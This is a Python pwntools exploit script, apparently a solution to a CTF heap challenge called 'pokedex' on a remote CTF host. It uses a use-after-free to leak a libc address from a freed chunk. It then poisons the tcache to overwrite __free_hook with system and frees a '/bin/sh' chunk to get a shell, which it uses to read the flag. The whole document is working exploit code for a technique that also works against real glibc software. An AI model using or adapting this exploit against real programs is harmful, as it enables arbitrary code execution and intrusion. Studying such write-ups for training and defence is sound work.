#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./pokedex_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

gdbscript = '''
    continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    if args.REMOTE:
        return remote('pwn.jeanne-hack-ctf.org', 9002)
    else:
        return process(elf.path)

convert = lambda x                  :x if type(x)==bytes else str(x).encode()
s       = lambda data               :p.send(convert(data))
sa      = lambda delim, data        :p.sendafter(convert(delim), convert(data), timeout=context.timeout)
sl      = lambda data               :p.sendline(convert(data))
sla     = lambda delim,data         :p.sendlineafter(convert(delim), convert(data), timeout=context.timeout)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop, timeout=context.timeout)
r       = lambda n                  :p.recv(n)
rl      = lambda                    :p.recvline()

def malloc(idx, size, data):
    sla('> ', '1')
    sla(': ', idx)
    sla(': ', size)
    sla(': ', data)

def edit(idx, size, data):
    sla('> ', '2')
    sla(': ', idx)
    sla(': ', size)
    sla(': ', data)

def free(idx):
    sla('> ', '3')
    sla(': ', idx)

def insp3ct(idx):
    sla('> ', '4')
    sla(': ', idx)

p = start()

malloc(0, 1280, 'trash-0')
malloc(1, 1280, 'trash-1')

free(0)

insp3ct(0)
ru(' 0: ')
MAIN_ARENA = int(rl().strip(), 16)
libc.address = MAIN_ARENA - 0x3ebca0
info('main arena: ' + hex(MAIN_ARENA))
info('libc base : ' + hex(libc.address))

malloc(2, 0x60, 'trash-2') 
free(2)
edit(2, 8, p64(libc.sym.__free_hook))

malloc(3, 0x60, '/bin/sh\x00') 
malloc(4, 0x60, p64(libc.sym.system))

free(3)
sl('cat flag.txt')

p.interactive()
